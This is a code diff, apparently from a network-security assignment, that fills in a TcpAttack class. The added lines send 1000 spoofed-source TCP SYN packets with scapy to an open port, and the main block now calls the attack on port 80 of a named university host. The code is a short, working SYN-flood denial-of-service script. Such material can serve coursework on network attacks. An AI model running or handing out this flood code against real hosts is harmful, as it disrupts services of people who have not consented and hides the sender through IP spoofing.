@@ -3,7 +3,7 @@
 __author__ = 'Jinyi Zhang'
 
 import socket
-import scapy
+from scapy.all import *
 
 class TcpAttack:
 
@@ -37,14 +37,16 @@ class TcpAttack:
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        s.settimeout(2)
+        s.settimeout(5)
 
         result = s.connect_ex((self.targetIP, port))
+        
+        s.close()
 
         if (result == 0):
             for ct in range(1000):
-
-
+                send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(), dport=port, flags="S"))
+            return 1
         else:
             return 0
 
@@ -52,4 +54,7 @@ if __name__ == "__main__":
 
     tcp = TcpAttack('localhost', 'sopa.ecn.purdue.edu')
 
-    tcp.scanTarget(20, 445)
+    #tcp.scanTarget(20, 445)
+
+    result = tcp.attackTarget(80)
+    print(result)
